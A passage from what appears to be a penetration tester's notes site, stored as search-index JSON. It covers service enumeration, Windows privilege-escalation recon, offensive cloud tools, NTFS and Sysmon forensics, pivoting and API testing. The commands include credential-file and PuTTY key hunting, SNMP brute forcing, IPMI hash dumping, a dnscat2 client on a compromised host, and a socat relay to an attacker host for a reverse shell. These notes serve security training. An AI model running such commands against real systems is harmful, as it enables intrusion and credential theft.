<code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code> SMB enumeration using enum4linux."},{"location":"Cheatsheets/Services/#nfs","title":"NFS","text":"Command Description <code>showmount -e &lt;FQDN/IP&gt;</code> Show available NFS shares. <code>mount -t nfs &lt;FQDN/IP&gt;:/&lt;share&gt; ./target-NFS/ -o nolock</code> Mount the specific NFS share.umount ./target-NFS <code>umount ./target-NFS</code> Unmount the specific NFS share."},{"location":"Cheatsheets/Services/#dns","title":"DNS","text":"Command Description <code>dig ns &lt;domain.tld&gt; @&lt;nameserver&gt;</code> NS request to the specific nameserver. <code>dig any &lt;domain.tld&gt; @&lt;nameserver&gt;</code> ANY request to the specific nameserver. <code>dig axfr &lt;domain.tld&gt; @&lt;nameserver&gt;</code> AXFR request to the specific nameserver. <code>dnsenum --dnsserver &lt;nameserver&gt; --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld&gt;</code> Subdomain brute forcing."},{"location":"Cheatsheets/Services/#smtp","title":"SMTP","text":"Command Description <code>telnet &lt;FQDN/IP&gt; 25</code>"},{"location":"Cheatsheets/Services/#imappop3","title":"IMAP/POP3","text":"Command Description <code>curl -k 'imaps://&lt;FQDN/IP&gt;' --user &lt;user&gt;:&lt;password&gt;</code> Log in to the IMAPS service using cURL. <code>openssl s_client -connect &lt;FQDN/IP&gt;:imaps</code> Connect to the IMAPS service. <code>openssl s_client -connect &lt;FQDN/IP&gt;:pop3s</code> Connect to the POP3s service."},{"location":"Cheatsheets/Services/#snmp","title":"SNMP","text":"Command Description <code>snmpwalk -v2c -c &lt;community string&gt; &lt;FQDN/IP&gt;</code> Querying OIDs using snmpwalk. <code>onesixtyone -c community-strings.list &lt;FQDN/IP&gt;</code> Bruteforcing community strings of the SNMP service. <code>braa &lt;community string&gt;@&lt;FQDN/IP&gt;:.1.*</code> Bruteforcing SNMP service OIDs."},{"location":"Cheatsheets/Services/#mysql","title":"MySQL","text":"Command Description <code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;FQDN/IP&gt;</code> Login to the MySQL server."},{"location":"Cheatsheets/Services/#mssql","title":"MSSQL","text":"Command Description <code>mssqlclient.py &lt;user&gt;@&lt;FQDN/IP&gt; -windows-auth</code> Log in to the MSSQL server using Windows authentication."},{"location":"Cheatsheets/Services/#ipmi","title":"IPMI","text":"Command Description <code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code> IPMI version detection. <code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code> Dump IPMI hashes."},{"location":"Cheatsheets/Services/#linux-remote-management","title":"Linux Remote Management","text":"Command Description <code>ssh-audit.py &lt;FQDN/IP&gt;</code> Remote security audit against the target SSH service. <code>ssh &lt;user&gt;@&lt;FQDN/IP&gt;</code> Log in to the SSH server using the SSH client. <code>ssh -i private.key &lt;user&gt;@&lt;FQDN/IP&gt;</code> Log in to the SSH server using private key. <code>ssh &lt;user&gt;@&lt;FQDN/IP&gt; -o PreferredAuthentications=password</code> Enforce password-based authentication."},{"location":"Cheatsheets/Services/#windows-remote-management","title":"Windows Remote Management","text":"Command Description <code>rdp-sec-check.pl &lt;FQDN/IP&gt;</code> Check the security settings of the RDP service. <code>xfreerdp /u:&lt;user&gt; /p:\"&lt;password&gt;\" /v:&lt;FQDN/IP&gt;</code> Log in to the RDP server from Linux. <code>evil-winrm -i &lt;FQDN/IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code> Log in to the WinRM server. <code>wmiexec.py &lt;user&gt;:\"&lt;password&gt;\"@&lt;FQDN/IP&gt; \"&lt;system command&gt;\"</code> Execute command using the WMI service."},{"location":"Cheatsheets/Services/#oracle-tns","title":"Oracle TNS","text":"Command Description <code>./odat.py all -s &lt;FQDN/IP&gt;</code> Perform a variety of scans to gather information about the Oracle database services and its components. <code>sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;FQDN/IP&gt;/&lt;db&gt;</code> Log in to the Oracle database. <code>./odat.py utlfile -s &lt;FQDN/IP&gt; -d &lt;db&gt; -U &lt;user&gt; -P &lt;pass&gt; --sysdba --putFile C:\\\\insert\\\\path file.txt ./file.txt</code> Upload a file with Oracle RDBMS."},{"location":"Cheatsheets/Windows%20Privesc/","title":"Windows Privesc","text":"","tags":["windows","privesc"]},{"location":"Cheatsheets/Windows%20Privesc/#manual","title":"Manual","text":"<pre><code># Current User\nwhoami\nwhoami /groups\nwhoami /priv\n\n# Local Users\nnet user\nnet user $USERNAME\nGet-LocalUser\n\nnet group\nnet group $GROUP_NAME\nGet-LocalGroup\nGet-LocalGroupMember $GROUP_NAME\n\n# System\nsysteminfo\n\n# Processes\ntasklist\nGet-Process\n\n# Network\nipconfig /all\nroute print\nnetstat -ano\n\n# Powershell History\nGet-History\n(Get-PSReadlineOption).HistorySavePath\n\n# Scheduled tasks\nschtasks /query /fo LIST /v\nGet-ScheduledTask | where {$_.Author -notlike \"Microsoft*\"} | ft TaskName,URI\n\n# Softwares\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname \n\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n\n\n# Interesting files\nGet-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\n\nGet-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ovpn,*.kdbx -File -Recurse -ErrorAction SilentlyContinue\n\n\n# Services\nwmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\"\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n\n# If putty is installed, check credentials or keys\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s\nreg query HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys\\\n</code></pre>","tags":["windows","privesc"]},{"location":"Cheatsheets/Windows%20Privesc/#tools","title":"Tools","text":"<ul> <li>winPEAS<ul> <li>winPEAS.ps1</li> <li>winPEAS.exe</li> </ul> </li> <li>Seatbelt</li> <li>JAWS</li> </ul>","tags":["windows","privesc"]},{"location":"Cloud/Tools/","title":"Tools","text":""},{"location":"Cloud/Tools/#all-providers","title":"All Providers","text":"Name Description Scout Suite Security audit tool, generates a HTML report containing security misconfigurations and other informations Cloudfox Enumerate cloud environments to find attack paths. Mainly AWS but supports GCP and Azure too CloudPEASS A toolkit that leverages advanced techniques to enumerate permissions across major cloud providers"},{"location":"Cloud/Tools/#aws","title":"AWS","text":"Name Description WeirdAAL AWS Attack Library that uses recon modules to enumerate every aspect of an AWS environment enumerate-iam IAM enumeration tool that brute forces API calls to find allowed permissions coldsnap A command-line interface that uses the Amazon EBS direct APIs to upload and download snapshots"},{"location":"Cloud/Tools/#azure","title":"Azure","text":"Name Description AADInternals The ultimate Entra ID (Azure AD) / Microsoft 365 hacking and admin toolkit (Powershell) ROADTools A collection of Azure AD/Entra tools for offensive and defensive security purposes Monkey365 Microsoft365, Azure and Entra security configuration reviews (Powershell) o356spray Username enumeration and password spraying tool aimed at Microsoft O365 MicroBurst A collection of scripts for assessing Microsoft Azure security (Powershell) AzureHound Bloodhound ingestor for Azure (Powershell) globlob A fast enumeration tool for publicly exposed Azure Storage blobs TokenSmith A toolkit used in the manipulation of Entra ID tokens and attacks involving them pytune A post-exploitation tool for enrolling a fake device into Intune with mulitple platform support"},{"location":"Forensics/MFT/","title":"MFT","text":""},{"location":"Forensics/MFT/#understanding-the-master-file-table-mft-in-ntfs","title":"Understanding the Master File Table (MFT) in NTFS","text":""},{"location":"Forensics/MFT/#introduction","title":"Introduction","text":"<p>The Master File Table (MFT) in the NTFS filesystem is a \"database\" that contains information about every file and directory on the volume.</p>"},{"location":"Forensics/MFT/#types-of-data-in-the-mft","title":"Types of Data in the MFT","text":"<ol> <li>File and Directory Metadata:<ul> <li>File Name: The name of the file or directory.</li> <li>File Attributes: System, hidden, read-only, archive flags, etc.</li> <li>Timestamps: Creation time, modification time, access time, and MFT entry modification time.</li> </ul> </li> <li>File Size:<ul> <li>The size of the file in bytes.</li> </ul> </li> <li>File Permissions:<ul> <li>Access control lists (ACLs) and permission settings.</li> </ul> </li> <li>Data Location:<ul> <li>Data Runs: Pointers to the clusters on the disk where the actual file data is stored.</li> <li>Extent Information: Details about the contiguous or fragmented extents of the file.</li> </ul> </li> <li>File Content (for small files):<ul> <li>For small files, the actual content might be stored directly within the MFT entry, referred to as resident data.</li> </ul> </li> </ol> <p>Each MFT record is 1024 bytes in size. If a file on disk is smaller than 1024 bytes, it can be stored directly in the MFT entry. These are called MFT Resident files.</p>"},{"location":"Forensics/MFT/#recovering-information-from-the-mft","title":"Recovering Information from the MFT","text":""},{"location":"Forensics/MFT/#step-1-parsing","title":"Step 1: Parsing","text":"<p>Using Eric Zimmerman's tool MFTECmd, you can parse the MFT:</p> <pre><code>.\\MFTECmd.exe -f .\\files\\MFT --csv \".\\output\\\" --csvf mft_output.csv\n</code></pre> <p>Note: It is important to output the data in CSV format because the following tool can only extract data from CSV files.</p>"},{"location":"Forensics/MFT/#step-2-reading","title":"Step 2: Reading","text":"<p>Opening the parsed file with VS Code reveals it contains around 388,000 lines, making it difficult to read directly. </p> <p>To streamline the process, use Timeline Explorer. This tool helps display all the files and information needed:</p>"},{"location":"Forensics/MFT/#key-informations-available-in-timeline-explorer","title":"Key Informations Available in Timeline Explorer:","text":"<ul> <li>Filename</li> <li>File path</li> <li>Extension</li> <li>Last Modified Time, Creation Time, Last Access Time</li> <li>Whether the file was in use</li> </ul> <p>A variety of sorting options are available, making it very useful for investigations. You can sort by extension, time, and more.</p>"},{"location":"Forensics/MFT/#step-3-recovering-a-file-from-hex","title":"Step 3: Recovering a File from Hex","text":"<p>Now that you've found an interesting file, you may want to extract it. Here\u2019s how you can do that:</p> <p>Note: As mentioned earlier, each MFT record is 1024 bytes in size. If a file on disk is smaller than 1024 bytes, it can be recovered directly from the MFT.</p> <ol> <li>Find the Entry Number: Identify the entry number of the file you want to recover.</li> <li>Calculate the Hex Offset of the File:<ul> <li>Multiply the entry number by 1024.</li> <li>Example: For entry number 23436, the calculation is 1024 x 23436 = 23,998,464 (decimal) or 0x16E3000 (hex offset).</li> </ul> </li> <li>Use HxD to Extract the File:<ul> <li>Download and install HxD.</li> <li>Open the MFT table in HxD.</li> <li>Press <code>Ctrl + G</code> (or <code>Win + G</code>) to go to the specified offset.</li> <li>Export the content of the file from this offset. ![[Pasted image 20240610143555.png]]</li> </ul> </li> </ol>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/","title":"Sysmon EventID CheatSheet","text":""},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#overview","title":"Overview","text":"<p>Sysmon (System Monitor) is a Windows system service and device driver that logs system activity to the Windows event log. It provides detailed information about process creations, network connections, file creations, and more. Each type of activity is logged with a specific EventID.</p>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#eventids-and-descriptions","title":"EventIDs and Descriptions","text":""},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#process-events","title":"Process Events","text":"<ul> <li>EventID 1: Process Creation</li> <li>Logs when a process is created.</li> <li> <p>Fields: <code>ProcessId</code>, <code>Image</code>, <code>CommandLine</code>, <code>ParentProcessId</code>, <code>ParentImage</code>, <code>ParentCommandLine</code></p> </li> <li> <p>EventID 5: Process Terminated</p> </li> <li>Logs when a process terminates.</li> <li> <p>Fields: <code>ProcessId</code>, <code>Image</code>, <code>User</code></p> </li> <li> <p>EventID 6: Driver Loaded</p> </li> <li>Logs when a driver is loaded.</li> <li>Fields: <code>ImageLoaded</code>, <code>Hashes</code>, <code>Signed</code>, <code>Signature</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#file-events","title":"File Events","text":"<ul> <li>EventID 2: ** Process changed a file creation time**</li> <li>Logs when a process changed the time metadata.</li> <li>Can be related to timestoping attack</li> <li> <p>Fields: <code>ImageLoaded</code>, <code>Hashes</code>, <code>Signed</code>, <code>Signature</code>, <code>Image</code></p> </li> <li> <p>EventID 7: Image Load</p> </li> <li>Logs when an image (e.g., DLL) is loaded by a process.</li> <li> <p>Fields: <code>ImageLoaded</code>, <code>Hashes</code>, <code>Signed</code>, <code>Signature</code>, <code>Image</code></p> </li> <li> <p>EventID 8: CreateRemoteThread</p> </li> <li>Logs when a process creates a thread in another process.</li> <li>Fields: <code>SourceImage</code>, <code>SourceProcessId</code>, <code>TargetImage</code>, <code>TargetProcessId</code>, <code>NewThreadId</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#network-events","title":"Network Events","text":"<ul> <li>EventID 3: Network Connection</li> <li>Logs when a network connection is initiated.</li> <li>Fields: <code>SourceIp</code>, <code>SourcePort</code>, <code>DestinationIp</code>, <code>DestinationPort</code>, <code>Protocol</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#file-and-registry-events","title":"File and Registry Events","text":"<ul> <li>EventID 11: File Create</li> <li>Logs when a file is created or overwritten.</li> <li> <p>Fields: <code>FileName</code>, <code>Hashes</code></p> </li> <li> <p>EventID 12: Registry Object Added/Deleted</p> </li> <li>Logs when a registry object is added or deleted.</li> <li> <p>Fields: <code>EventType</code>, <code>UtcTime</code>, <code>ProcessGuid</code>, <code>ProcessId</code>, <code>Image</code>, <code>TargetObject</code></p> </li> <li> <p>EventID 13: Registry Value Set</p> </li> <li>Logs when a registry value is set.</li> <li> <p>Fields: <code>EventType</code>, <code>UtcTime</code>, <code>ProcessGuid</code>, <code>ProcessId</code>, <code>Image</code>, <code>TargetObject</code>, <code>Details</code></p> </li> <li> <p>EventID 14: Registry Object Renamed</p> </li> <li>Logs when a registry key or value is renamed.</li> <li>Fields: <code>EventType</code>, <code>UtcTime</code>, <code>ProcessGuid</code>, <code>ProcessId</code>, <code>Image</code>, <code>TargetObject</code>, <code>NewName</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#file-and-directory-events","title":"File and Directory Events","text":"<ul> <li>EventID 15: File Create Stream Hash</li> <li>Logs when a file stream is created.</li> <li> <p>Fields: <code>Hashes</code>, <code>FileName</code>, <code>StreamName</code></p> </li> <li> <p>EventID 16: Sysmon Configuration Change</p> </li> <li>Logs when the Sysmon configuration is changed.</li> <li> <p>Fields: <code>Configuration</code>, <code>UtcTime</code></p> </li> <li> <p>EventID 17: Pipe Created</p> </li> <li>Logs when a named pipe is created.</li> <li> <p>Fields: <code>PipeName</code>, <code>UtcTime</code></p> </li> <li> <p>EventID 18: Pipe Connected</p> </li> <li>Logs when a named pipe connection is made.</li> <li>Fields: <code>PipeName</code>, <code>UtcTime</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#wmi-events","title":"WMI Events","text":"<ul> <li>EventID 19: WMI Filter</li> <li>Logs when a WMI filter is registered.</li> <li> <p>Fields: <code>FilterName</code>, <code>Query</code></p> </li> <li> <p>EventID 20: WMI Consumer</p> </li> <li>Logs when a WMI consumer is registered.</li> <li> <p>Fields: <code>ConsumerName</code>, <code>FilterName</code></p> </li> <li> <p>EventID 21: WMI Consumer to Filter</p> </li> <li>Logs when a WMI consumer is bound to a filter.</li> <li>Fields: <code>ConsumerName</code>, <code>FilterName</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#dns-events","title":"DNS Events","text":"<ul> <li>EventID 22: DNS Query</li> <li>Logs when a DNS query is performed.</li> <li>Fields: <code>QueryName</code>, <code>QueryStatus</code>, <code>QueryResults</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#file-delete-events","title":"File Delete Events","text":"<ul> <li>EventID 23: File Delete (Pending)</li> <li>Logs when a file is marked for deletion.</li> <li> <p>Fields: <code>FileName</code>, <code>UtcTime</code></p> </li> <li> <p>EventID 24: File Deleted</p> </li> <li>Logs when a file deletion is completed.</li> <li>Fields: <code>FileName</code>, <code>UtcTime</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#clipboard-events","title":"Clipboard Events","text":"<ul> <li>EventID 25: Clipboard Change</li> <li>Logs when the clipboard content changes.</li> <li>Fields: <code>ProcessId</code>, <code>Image</code>, <code>QueryName</code>, <code>QueryResults</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#additional-events","title":"Additional Events","text":"<ul> <li>EventID 255: Error</li> <li>Logs errors encountered by Sysmon.</li> <li>Fields: <code>ErrorCode</code>, <code>Message</code></li> </ul>"},{"location":"Forensics/Sysmon%20EventID%20CheatSheet/#notes","title":"Notes","text":"<ul> <li>UtcTime: All event timestamps are in UTC time.</li> <li>Hashes: Include multiple hash types such as MD5, SHA256, and IMPHASH.</li> <li>Signed/Signature: Indicates if the file or driver is signed and provides signature details.</li> </ul>"},{"location":"Forensics/Techniques/","title":"Techniques","text":""},{"location":"Forensics/Techniques/#t1218-system-binary-proxy-execution","title":"T1218 (System Binary Proxy Execution)","text":"<ul> <li>Evasion technique</li> <li>Use a binary signed with a digital signature of Microsoft (whether native from Windows or downloaded on Microsoft Website)</li> <li>Used by attackers to use legitimate tool but for malicious purposes</li> <li>Seen in Sysmon EventID 1</li> </ul>"},{"location":"Forensics/Techniques/#t1204-user-execution","title":"T1204 (User Execution)","text":"<ul> <li>Execution technique</li> <li>Technique related to user interaction</li> </ul>"},{"location":"Forensics/Techniques/#t1070-indicator-removal","title":"T1070 (Indicator Removal)","text":"<ul> <li>Defense Evasion technique</li> <li>Subtechnique T1070.006 - TimeStomping (file creation date is changed to make it appear old)</li> <li>Seen in Sysmon EventID 2</li> </ul>"},{"location":"Forensics/Techniques/#t1036-masquerading","title":"T1036 (Masquerading)","text":"<ul> <li>Manipulate features of their artifacts to make them appear legitimate (e.g: APT32\u00a0has disguised a Cobalt Strike beacon as a Flash Installer)</li> </ul>"},{"location":"Forensics/Techniques/#t1055-process-injection","title":"T1055 (Process Injection)","text":"<ul> <li>Privilege Escalation </li> </ul>"},{"location":"Pivoting/DNS%20Tunneling/","title":"DNS Tunneling","text":"<p>We can use dnscat2. Server runs on an authoritative name server for a specific domain and clients run on compromised hosts.</p> <ol> <li> <p>Run the server on the name server: <pre><code>dnscat2-server \"$DOMAIN\"\n</code></pre></p> </li> <li> <p>Run the client on the compromised host: <pre><code>./dnscat \"$DOMAIN\"\n</code></pre></p> </li> <li> <p>Once connection is made, list the active windows with <code>windows</code>, and enter the window with <code>window -i $ID</code>.</p> </li> <li> <p>To port forward, run: <pre><code>listen 127.0.0.1:$PIVOT_PORT $TARGET_IP:$TARGET_PORT\n</code></pre></p> </li> </ol>","tags":["pivoting","linux"]},{"location":"Pivoting/ICMP%20Tunnelling/","title":"ICMP Tunnelling","text":"<p>ICMP tunnelling encapsulates your traffic within <code>ICMP packets</code> containing <code>echo requests</code> and <code>responses</code>. ICMP tunneling would only work when ping responses are permitted within a firewalled network.</p> <p>The ptunnel-ng tool allows to create a tunnel between the pivot and the attack host</p> <ol> <li> <p>Start the server on the target host: <pre><code>sudo ./ptunnel-ng -r&lt;server-ip&gt; -R22\n</code></pre> -&gt; The <code>server-ip</code> is whatever IP is accessible from the attack host</p> </li> <li> <p>Connect to the server from the attack host: <pre><code>sudo ./ptunnel-ng -p&lt;server-ip&gt; -l&lt;local-port&gt; -r&lt;target-ip&gt; -R22\n</code></pre></p> </li> </ol> <p>At this point, we can already access the target through the attack host on the <code>local-port</code>.</p>"},{"location":"Pivoting/ICMP%20Tunnelling/#dynamic-port-forwarding","title":"Dynamic Port Forwarding","text":"<p>This assumes that the target-ip has a SSH server, and will serve as pivot.</p> <ol> <li> <p>Enable dynamic port forwarding with SSH: <pre><code>ssh -D &lt;proxy-port&gt; -p&lt;local-port&gt; -l&lt;ssh-username&gt; 127.0.0.1\n</code></pre></p> </li> <li> <p>Configure proxychains</p> </li> </ol>"},{"location":"Pivoting/Meterpreter%20Pivoting/","title":"Meterpreter Pivoting","text":""},{"location":"Pivoting/Meterpreter%20Pivoting/#static-port-forwarding","title":"Static Port Forwarding","text":"<p>With a meterpreter session established, we can use <code>portfwd</code> to easily forward ports.</p> <pre><code>portfwd add -l &lt;local-port&gt; -p &lt;target-port&gt; -r &lt;target-ip&gt;\n</code></pre>"},{"location":"Pivoting/Meterpreter%20Pivoting/#dynamic-port-forwarding","title":"Dynamic Port Forwarding","text":"<ol> <li> <p>When our meterpreter session is established, we can use the <code>auxiliary/server/socks_proxy</code> module start a listener on the port specified by <code>SRVPORT</code>. The <code>SRVHSOT</code> should be set to <code>0.0.0.0</code> to listen on every interface and the SOCKS <code>version</code> should be set to <code>4a</code>.</p> </li> <li> <p>Add the following line to <code>/etc/proxychains.conf</code>:</p> <pre><code>socks4  127.0.0.1 &lt;SRVPORT&gt;\n</code></pre> </li> <li> <p>We can then create the routes with the <code>post/multi/manage/autoroute</code> module. All we have to set is the meterpreter <code>SESSION</code> and the target <code>SUBNET</code>.</p> </li> <li> <p>We can now use external tools with proxychains, or use metasploit's modules directly against the target network's hosts.</p> </li> </ol> <p>Note: The first 2 steps are only necessary if we want to use tools external to metasploit. (i.e. Nmap or a RDP client)</p>"},{"location":"Pivoting/Meterpreter%20Pivoting/#reverse-port-forwarding","title":"Reverse Port Forwarding","text":"<p>As for static port forwarding, we can use <code>portfwd</code> from within the meterpreter session. <code>portfwd</code> has a built-in option for reverse port forwarding.</p> <pre><code>portfwd add -R -l &lt;attacker-port&gt; -p &lt;pivot-port&gt; -L &lt;pivot-ip&gt;\n</code></pre>"},{"location":"Pivoting/SOCKS%20Tunnelling/","title":"Socks Tunnelling","text":""},{"location":"Pivoting/SOCKS%20Tunnelling/#server-on-pivot","title":"Server on Pivot","text":"<ol> <li> <p>Start the server on the pivot host: <pre><code>./chisel server -v -p &lt;server-port&gt; --socks5\n</code></pre></p> </li> <li> <p>Connect to the server using the client on the attack host: <pre><code>./chisel client -v &lt;server-host&gt;:&lt;server-port&gt; socks\n</code></pre></p> </li> <li> <p>Modify proxychain's config by adding: <pre><code>socks5 127.0.0.1 1080\n</code></pre></p> </li> </ol>"},{"location":"Pivoting/SOCKS%20Tunnelling/#client-on-pivot","title":"Client on Pivot","text":"<ol> <li> <p>Start the server on the attack host: <pre><code>sudo ./chisel server --reverse -v -p &lt;server-port&gt; --socks5\n</code></pre></p> </li> <li> <p>Connect to the server using the client on the pivot host: <pre><code>./chisel client -v &lt;server-host&gt;:&lt;server-port&gt; R:socks\n</code></pre></p> </li> <li> <p>Modify proxychain's config by adding: <pre><code>socks5 127.0.0.1 1080\n</code></pre></p> </li> </ol>"},{"location":"Pivoting/SSH%20Tunnelling/","title":"SSH Tunnelling","text":""},{"location":"Pivoting/SSH%20Tunnelling/#linux","title":"Linux","text":""},{"location":"Pivoting/SSH%20Tunnelling/#local-port-forwarding","title":"Local Port Forwarding","text":"<p>Use case: we know what port we want to forward / what service to target.</p> <pre><code>ssh -N -L 0.0.0.0:$PIVOT_PORT:$TARGET_IP:$TARGET_PORT $SSH_USER@$SSH_IP\n</code></pre> <ul> <li><code>PIVOT_PORT</code> -&gt; port on which the pivot will listen</li> <li><code>TARGET_IP</code> -&gt; IP address of the target machine</li> <li><code>TARGET_PORT</code> -&gt; port on the target machine</li> </ul>"},{"location":"Pivoting/SSH%20Tunnelling/#dynamic-port-forwarding","title":"Dynamic Port Forwarding","text":"<p>Use case: we don't know the target port.</p> <ol> <li> <p>Enable dynamic port forwarding with SSH: <pre><code>ssh -N -D 0.0.0.0:1080 $SSH_USER@$SSH_IP\n</code></pre></p> </li> <li> <p>Add the following to <code>/etc/proxychains.conf</code>: <pre><code>socks5  $PIVOT_IP 1080\n</code></pre></p> </li> </ol>"},{"location":"Pivoting/SSH%20Tunnelling/#reverse-port-forwarding","title":"Reverse Port Forwarding","text":"<p>Use case: forward a local service to the remote port.</p> <pre><code>ssh -N -R $PIVOT_IP:$PIVOT_PORT:0.0.0.0:$LOCAL_PORT $SSH_USER@$SSH_IP\n</code></pre> <p>Every request made from the internal network to <code>$PIVOT_IP</code> on the <code>$PIVOT_PORT</code> will be routed to our machine on the <code>$LOCAL_PORT</code></p>"},{"location":"Pivoting/SSH%20Tunnelling/#remote-port-forwarding","title":"Remote Port Forwarding","text":"<p>Use case: inbound SSH connections are blocked.</p> <ol> <li>Setup a SSH server on attacker host</li> <li>From pivot, run: <pre><code>ssh -R 0.0.0.0:$LOCAL_PORT:$TARGET_IP:$TARGET_PORT $SSH_USER@$SSH_IP\n</code></pre></li> </ol>"},{"location":"Pivoting/SSH%20Tunnelling/#remote-dynamic-port-forwarding","title":"Remote Dynamic Port Forwarding","text":"<p>Use case: inbound SSH connections are blocked &amp; we don't know the target port.</p> <p>Combination of <code>Remote Port Forwarding</code> and <code>Dynamic Port Forwarding</code>.</p> <ol> <li> <p>From pivot, run: <pre><code>ssh -R 1080 $SSH_USER@$SSH_IP\n</code></pre></p> </li> <li> <p>Modify <code>proxychains.conf</code> as shown in Dynamic Port Forwarding</p> </li> </ol>"},{"location":"Pivoting/SSH%20Tunnelling/#windows","title":"Windows","text":""},{"location":"Pivoting/SSH%20Tunnelling/#sshexe","title":"ssh.exe","text":"<p>Same usage as on Linux. May not be in PATH by default, generally in <code>C:\\Windows\\System32\\OpenSSH\\</code>.</p>"},{"location":"Pivoting/SSH%20Tunnelling/#plink-reverse-port-forwarding","title":"Plink (reverse port forwarding)","text":"<ol> <li>Setup a SSH server on attacking machine (<code>LOCAL</code>)</li> <li>Transfer <code>plink.exe</code> to pivot</li> <li>Start the reverse port forward: <pre><code>plink.exe -ssh -l $LOCAL_USER -pw $LOCAL_PASSWORD -R 127.0.0.1:$LOCAL_PORT:$TARGET_IP:$TARGET_PORT $LOCAL_IP\n</code></pre></li> </ol>"},{"location":"Pivoting/SSH%20Tunnelling/#netsh","title":"Netsh","text":"<p>TODO</p>"},{"location":"Pivoting/Socat%20Redirection/","title":"Socat Redirection","text":"<p>Socat is a bidirectional relay tool that can create pipe sockets between <code>2</code> independent network channels without needing to use SSH tunneling.</p> <p>It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.</p>"},{"location":"Pivoting/Socat%20Redirection/#redirection-with-a-reverse-shell","title":"Redirection with a Reverse Shell","text":"<p>On the pivot, we can enable redirection from the pivot on <code>pivot-port</code> to the <code>attacker-host</code> on <code>attacker-port</code>:</p> <pre><code>socat TCP4-LISTEN:&lt;pivot-port&gt;,fork TCP4:&lt;attacker-host&gt;:&lt;attacker-port&gt;\n</code></pre> <p>We can then use the pivot to start a reverse shell.</p>"},{"location":"Pivoting/Socat%20Redirection/#redirection-with-a-bind-shell","title":"Redirection with a Bind Shell","text":"<p>Well, it's pretty much the same as with a reverse shell, but reversed:</p> <pre><code>socat TCP4-LISTEN:&lt;local-port&gt;,fork TCP4:&lt;target-host&gt;:&lt;target-port&gt;\n</code></pre>"},{"location":"Web/API%20testing/","title":"API testing","text":"","tags":["web","api"]},{"location":"Web/API%20testing/#find-documentation","title":"Find Documentation","text":"<p>Some common documentation endpoints: <pre><code>/api\n/api/v1\n/swagger/\n/api/swagger/\n/api/swagger/v1\n/openapi.json\n</code></pre></p> <p>Complete wordlist here</p> <p>OpenAPI can be parsed by Burp using OpenAPI Parser extension.</p>","tags":["web","api"]},{"location":"Web/API%20testing/#identify-http-methods","title":"Identify HTTP methods","text":"<p>With <code>OPTIONS</code> method and by fuzzing: <pre><code>GET\nHEAD\nPOST\nPUT\nDELETE\nTRACE\nCONNECT\nPATCH\nCOPY\nMOVE\n</code></pre></p> <p>Larger list here</p>","tags":["web","api"]},{"location":"Web/API%20testing/#identify-content-types","title":"Identify Content-Types","text":"<p>Either manually or with Content type converter extension.</p> <p>Big wordlist here</p>","tags":["web","api"]},{"location":"Web/API%20testing/#fuzz-for-hidden-endpoints","title":"Fuzz for Hidden Endpoints","text":"<p>Either by deduction, for instance if there is a <code>PUT /api/user/update</code> endpoint there might be a <code>POST /api/user/add</code>.</p> <p>Or by fuzzing using common API naming convention wordlists such as this one.</p> <p>More relevant wordlists here</p>","tags":["web","api"]},{"location":"Web/API%20testing/#find-hidden-parameters","title":"Find Hidden Parameters","text":"<p>Fuzz using a wordlist of common parameters, adding relevant names from the application.</p> <p>Or use the Param Miner extension, which guesses relevant names based on information in the scope.</p>","tags":["web","api"]},{"location":"Web/API%20testing/#check-for-mass-alignment","title":"Check for Mass Alignment","text":"<p>Also known as auto-binding, it occurs when the request parameters are bound to an internal object.</p> <p>Identify hidden parameters, for instance in a <code>PATCH /api/users/</code> request like: <pre><code>{\n    \"username\": \"wiener\",\n    \"email\": \"wiener@example.com\",\n}\n</code></pre></p> <p>If the object has a internal <code>isAdmin</code> property in the backend, we could craft a <code>PATCH /api/users/</code> request like: <pre><code>{\n    \"username\": \"wiener\",\n    \"email\": \"wiener@example.com\",\n    \"isAdmin\": true,\n}\n</code></pre></p>","tags":["web","api"]},{"location":"Web/API%20testing/#test-for-server-side-parameter-pollution","title":"Test for Server-Side Parameter Pollution","text":"<p>In addition to techniques below, the Burp Scanner can partially detect suspicious input transformations.</p> <p>The Backslash Powered Scanner extension can also identify server-side parameter pollution.</p>","tags":["web","api"]},{"location":"Web/API%20testing/#in-the-query-strings","title":"In the Query Strings","text":"<p>Try to append a URL-encoded # to the query string and observe the behaviour. This has for potential effect to strip the rest of the query on the server's side.</p> <p>Using a URL-encoded &amp; could have for effect to add a second parameter on the server's side.</p> <p>If a second parameter can be injected, try and add a second valid parameter. Fuzzing can also be a solution, for instance with Burp's Server-side variable names wordlist.</p> <p>Try to override an existing parameter by adding a second parameter with the same name but a different value and observe the response: - 